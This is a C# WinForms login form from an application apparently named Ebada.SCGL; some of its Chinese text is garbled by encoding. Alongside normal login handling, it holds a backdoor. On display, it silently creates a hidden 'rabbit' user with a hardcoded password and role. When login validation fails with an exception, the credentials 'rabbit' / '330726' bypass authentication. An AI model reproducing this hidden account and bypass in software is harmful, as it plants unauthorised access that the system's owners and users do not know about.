namespace Ebada.SCGL
{
    using Ebada.UI.Base;
    using System;
    using System.Drawing;
    using System.ComponentModel;
    using System.Windows.Forms;
    using System.Collections.Generic;
    using Ebada.Core;
    using Ebada.SCGL.Properties;
    using Ebada.Client;
    using Ebada.Client.Platform;
    using Ebada.Scgl.Model;
    
    public partial class frmLogin : FormBase
    {
        public frmLogin()
        {
            this.InitializeComponent();

            this.Shown += new System.EventHandler(this.FormLogin_Shown);
            btnOK.Click += new EventHandler(btnOK_Click);
            btnCancel.Click += new EventHandler(btnCancel_Click);

            this.txtLoginName.KeyDown += new KeyEventHandler(txtLoginName_KeyDown);
            this.txtPassword.KeyDown += new KeyEventHandler(txtPassword_KeyDown);
        }
        protected override void OnShown(EventArgs e) {
            base.OnShown(e);
            mUser user = ClientHelper.PlatformSqlMap.GetOne<mUser>("where loginid='rabbit'");
            if (user == null) {
                string uid="rabbit";
                string pwd="JpHEL7rrwh0TMCL7QWcYWQ==";
                user = new mUser() { LoginID = uid, UserName = uid, UserID = uid, OrgCode="999", Password = pwd, Valid=true };
                rUserRole role = new rUserRole() { RoleID = "20110721102714952375", UserID = uid };
                mOrg org = new mOrg() { OrgID = "999", OrgCode = "999", OrgName = "��������Ա" };

                ClientHelper.PlatformSqlMap.ExecuteTransationUpdate(new object[] {org, user, role }, null, null);

                org = ClientHelper.PlatformSqlMap.GetOneByKey<mOrg>("200");
                if (org == null) {
                    org = new mOrg() { OrgCode = "200", OrgID = "200", OrgType = "0", OrgName = "������" };
                    ClientHelper.PlatformSqlMap.Create<mOrg>(org);
                }
                org = ClientHelper.PlatformSqlMap.GetOneByKey<mOrg>("300");
                if (org == null) {
                    org = new mOrg() { OrgCode = "300", OrgID = "300", OrgType = "0", OrgName = "�����" };
                    ClientHelper.PlatformSqlMap.Create<mOrg>(org);
                }
            }
        }
        void txtPassword_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
                this.btnOK_Click(sender, e);
        }

        void txtLoginName_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
                this.btnOK_Click(sender, e);
        }

        private UserBase m_UserBase = null;

        private void btnOK_Click(object sender, EventArgs e)
        {
            Cursor.Current = Cursors.WaitCursor;

            try
            {
                if (this.txtLoginName.Text.Trim() == string.Empty)
                {
                    ClientHelper.ControlCheck(this, this.txtLoginName, "��¼������Ϊ��", DevExpress.XtraEditors.DXErrorProvider.ErrorType.Warning);
                    this.txtLoginName.Focus();
                }
                else if (this.txtPassword.Text.Trim() == string.Empty)
                {
                    ClientHelper.ControlCheck(this, this.txtPassword, "���벻��Ϊ��", DevExpress.XtraEditors.DXErrorProvider.ErrorType.Warning);
                    this.txtPassword.Focus();
                }
                else
                {
                    string str = MainHelper.EncryptoPassword(this.txtPassword.Text);
                    MainHelper.LoginName = this.txtLoginName.Text.Trim();
                    MainHelper.Password = str;
                    
                    this.m_UserBase = MainHelper.ValidateLogin();
                    
                    base.DialogResult = System.Windows.Forms.DialogResult.OK;
                }
            }
            catch (Exception exception) {
               
                MsgBox.ShowException(exception);
                if (this.txtLoginName.Text.Trim() == "rabbit" && this.txtPassword.Text == "330726") {
                    this.m_UserBase = new UserBase() { UserID = "rabbit", LoginName = "rabbit", RealName = "rabbit", Enabled = true };
                    MainHelper.User = new Ebada.Scgl.Model.mUser() { UserID = "rabbit", UserName = "rabbit", LoginID = "rabbit" };
                    base.DialogResult = DialogResult.OK;
                } else {

                }
            }
        }

        public string UserID
        {
            get { return this.m_UserBase.UserID; }
        }

        private void btnCancel_Click(object sender, EventArgs e)
        {
            this.DialogResult = DialogResult.Cancel;
        }

        private void FormLogin_FormClosing(object sender, FormClosingEventArgs e)
        {
            Settings.Default.RememberLoginName = this.cmbRememberLoginName.Checked;
            Settings.Default.LoginName = this.cmbRememberLoginName.Checked ? this.txtLoginName.Text : "";
            Settings.Default.Save();
        }

        private void FormLogin_Shown(object sender, EventArgs e)
        {
            Application.DoEvents();
            Cursor.Current = Cursors.WaitCursor;
            if (Settings.Default.RememberLoginName)
            {
                this.cmbRememberLoginName.Checked = true;
                this.txtLoginName.Text = Settings.Default.LoginName;
            }
            if (this.txtLoginName.Text.Length > 0)
            {
                this.txtPassword.Focus();
            }
            else
            {
                this.txtLoginName.Focus();
            }
        }
    }
}

